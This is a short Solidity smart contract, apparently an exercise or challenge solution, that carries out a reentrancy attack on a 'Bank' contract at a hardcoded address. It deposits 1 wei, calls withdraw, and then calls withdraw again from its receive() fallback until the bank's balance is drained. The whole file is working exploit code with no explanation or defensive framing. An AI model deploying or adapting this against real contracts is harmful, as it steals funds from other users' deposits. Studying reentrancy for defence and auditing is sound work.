// SPDX-License-Identifier: MIT
pragma solidity >=0.8.26 <0.9.0;

interface Bank {
    function deposit(uint amount) external payable;
    function withdraw() external payable;
}

contract Drill {

    Bank private bank;
    string public objective = "Drill the bank!";

    constructor(){
        bank = Bank(0xD525995a444F9de1F4979E8C03B9845e7D3fBc65);
    }

    receive() external payable {
        if (address(bank).balance >= 1 wei) {
            bank.withdraw();
        }
    }

    function drill() external payable {
        require(msg.value >= 1 wei, "Need to send at least 1 wei to exploit");
        bank.deposit{value: 1 wei}(1 wei);
        bank.withdraw();
    }

}